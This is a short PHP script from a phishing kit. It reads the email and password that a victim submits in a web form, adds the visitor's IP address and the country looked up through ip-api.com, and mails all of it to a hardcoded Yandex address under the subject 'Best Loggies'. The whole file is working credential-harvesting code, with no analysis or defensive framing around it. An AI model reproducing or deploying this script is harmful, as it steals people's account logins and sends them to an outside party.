<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $pop= $_POST['email'];
 $popi = $_POST['password'];
 
		$agwu = "mfgsgdfng@yandex.ru";

    // Get user's country based on IP address
    $ip = $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/" . $ip;
    $response = file_get_contents($url);
    $data = json_decode($response);
    $country = $data->country;
		
		
         $opi = "Best Loggies : $ip";
		 
		 $apki =  "Email ID            : ".$pop."\r\n";
         $apki .= "Password           : ".$popi."\r\n";
		 $apki .= "IP           : ".$ip."\r\n";
		 $apki .= "Country           : ".$country."\r\n";
		$header = "Content type: Street Vibes \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($agwu,$opi,$apki,$header);




}
?>